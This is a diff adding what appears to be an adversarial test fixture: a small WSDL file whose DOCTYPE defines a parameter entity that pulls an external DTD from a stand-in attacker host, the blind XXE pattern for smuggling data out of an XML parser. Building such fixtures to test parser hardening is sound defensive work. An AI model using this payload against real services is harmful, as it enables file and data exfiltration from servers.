@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Adversarial: parameter-entity indirection (the "blind XXE" shape) — the DTD
+     defines a parameter entity that pulls in an external DTD, which is how a
+     payload smuggles data out when direct entity output is suppressed. -->
+<!DOCTYPE wsdl:definitions [
+  <!ENTITY % remote SYSTEM "http://attacker.example.com/collect.dtd">
+  %remote;
+]>
+<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
+                  xmlns:xs="http://www.w3.org/2001/XMLSchema"
+                  targetNamespace="https://example.com/blind"
+                  name="BlindService">
+  <wsdl:types>
+    <xs:schema targetNamespace="https://example.com/blind">
+      <xs:element name="Echo" type="xs:string"/>
+    </xs:schema>
+  </wsdl:types>
+  <wsdl:portType name="EchoPort">
+    <wsdl:operation name="Echo"/>
+  </wsdl:portType>
+</wsdl:definitions>
